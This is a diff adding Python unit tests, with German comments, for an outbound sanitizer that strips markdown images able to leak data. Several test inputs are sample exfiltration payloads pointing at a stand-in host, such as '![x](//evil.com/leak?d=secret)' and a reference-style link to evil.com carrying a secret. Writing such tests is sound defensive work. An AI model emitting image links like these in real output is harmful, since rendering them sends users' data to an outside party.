@@ -131,6 +131,35 @@ class TestSanitizeOutbound:
         assert "evil.com" not in result
         assert "[image blocked by security policy]" in result
 
+    def test_block_protocol_relative_image(self):
+        # Mail-Clients lösen //host gegen https auf — gleicher Exfil-Kanal
+        text = "![x](//evil.com/leak?d=secret)"
+        result = sanitize_outbound(text)
+        assert "evil.com" not in result
+        assert "[image blocked by security policy]" in result
+
+    def test_block_data_uri_image(self):
+        text = "![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)"
+        result = sanitize_outbound(text)
+        assert "data:" not in result
+
+    def test_block_other_scheme_image(self):
+        text = "![x](ftp://evil.com/leak) und ![y](cid:foo@bar)"
+        result = sanitize_outbound(text)
+        assert "ftp://" not in result
+        assert "cid:" not in result
+
+    def test_block_reference_style_image(self):
+        text = "![alt][ref]\n\n[ref]: https://evil.com/leak?d=secret"
+        result = sanitize_outbound(text)
+        assert "![alt][ref]" not in result
+        assert "[image blocked by security policy]" in result
+
+    def test_preserve_relative_image(self):
+        # Relative Pfade erreichen aus Mail/Chat keinen externen Host
+        text = "![chart](/charts/local.png)"
+        assert sanitize_outbound(text) == text
+
     def test_preserve_non_image_links(self):
         text = "Check [this link](https://example.com)"
         result = sanitize_outbound(text)
